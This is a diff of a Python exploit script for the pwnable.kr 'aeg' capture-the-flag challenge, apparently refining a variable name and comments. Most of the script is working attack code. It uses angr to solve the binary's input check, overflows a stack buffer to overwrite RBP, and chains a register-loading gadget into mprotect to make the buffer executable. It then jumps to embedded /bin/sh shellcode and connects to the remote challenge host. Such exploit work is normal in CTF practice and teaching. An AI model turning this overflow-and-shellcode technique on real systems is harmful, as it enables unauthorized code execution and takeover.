@@ -10,7 +10,7 @@ shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6
 
 def parse_bin(fname):
     ''' This function parses the random binary and extracts symbols necessary for exploitation'''
-    global start, avoid, target, overflow_padding, buf_addr, loadreg_gadget_addr, loadreg_gadget_offset, xor_pad, mprotect
+    global start, avoid, target, overflow_padding, buf_addr, loadreg_gadget_addr, loadreg_gadget_rbp_offset, xor_pad, mprotect
 
     objdump = subprocess.check_output("objdump -d {} -M intel".format(fname), shell=True)
     objdump_lines = objdump.split("\n")
@@ -50,7 +50,7 @@ def parse_bin(fname):
     # Get address of gadget that loads all registers as local variables from rbp
     loadreg_gadget = re.findall(hex_rex + ":.{0,30}?" + "mov\s*QWORD PTR \[rbp-0x" + hex_rex + ".{0,10}?r9", objdump)
     loadreg_gadget_addr = int(loadreg_gadget[1][0], 16) + 4
-    loadreg_gadget_offset = int(loadreg_gadget[1][1], 16) - 40
+    loadreg_gadget_rbp_offset = int(loadreg_gadget[1][1], 16) - 40
 
     print "start", hex(start)
     print "avoid", hex(avoid)
@@ -58,7 +58,7 @@ def parse_bin(fname):
     print "overflow padding", hex(overflow_padding)
     print "buf_addr", hex(buf_addr)
     print "loadreg_gadget_addr", hex(loadreg_gadget_addr)
-    print "loadreg_gadget_offset", hex(loadreg_gadget_offset)
+    print "loadreg_gadget_rbp_offset", hex(loadreg_gadget_rbp_offset)
 
 def solve_angr(fname):
     project = angr.Project(fname)
@@ -92,8 +92,9 @@ def construct_payload(fname):
     parse_bin(fname)
     solved_input = solve_angr(fname)
 
+    print "[-] Exploit phase"
     # First chain
-    # Set RBP to be beyond buffer, so that this gadget fills registers
+    # Set RBP to be within buffer, so that this gadget fills registers
     '''
  13679c4:   4c 8b 45 b0             mov    r8,QWORD PTR [rbp-0x50]
  13679c8:   48 8b 7d a0             mov    rdi,QWORD PTR [rbp-0x60]
@@ -107,8 +108,8 @@ def construct_payload(fname):
 
     payload = 'Q'*overflow_padding # padding from does_memcpy function
 
-    new_rbp_padding = 48 + overflow_padding + 7*8 + loadreg_gadget_offset
-    payload +=  p64(buf_addr + new_rbp_padding) # Overwrite RBP with buffer address that correctly aligns local variables with register vals
+    new_rbp_padding = 48 + overflow_padding + 7*8 + loadreg_gadget_rbp_offset # len(input) + overflow pad + space for regs + random gadget rbp offset
+    payload += p64(buf_addr + new_rbp_padding) # Overwrite RBP with buffer address that correctly aligns local variables with register vals
     payload += p64(loadreg_gadget_addr) # points to gadget above
     payload += 'F'*8 # rdi, dummy val because overwritten by rax
     payload += 'C'*8 # rcx 
@@ -118,7 +119,7 @@ def construct_payload(fname):
     payload += p64(buf_addr & 0xFFFFFFFFFFFFF000) # rax, moved to rdi. mprotect addr arg, page-aligned
     
     # Second chain, call mprotect(buf_addr, 0x10000, 7)
-    payload += 'Y'*loadreg_gadget_offset # leave will mov rsp, rbp, so now rsp points here
+    payload += 'Y'*loadreg_gadget_rbp_offset # leave will mov rsp, rbp, so now rsp points here in buf
     payload += p64(mprotect)
     
     # Now, get ourselves pointed to shellcode
@@ -129,7 +130,6 @@ def construct_payload(fname):
     print "payload", solved_input + payload
     return solved_input + payload
 
-print "[-] Exploit phase"
 if len(sys.argv) > 1 and sys.argv[1] == 'remote':
     p = remote("pwnable.kr", 9005)
     binary = p.recvuntil("hurry up!")
@@ -149,9 +149,4 @@ if len(sys.argv) > 1 and sys.argv[1] == 'remote':
 else:
     fname = "aeg2bin"
     payload = construct_payload(fname)
-    
-    p = process([fname, payload])
-
-    print p.recvall()
-    p.interactive()
 
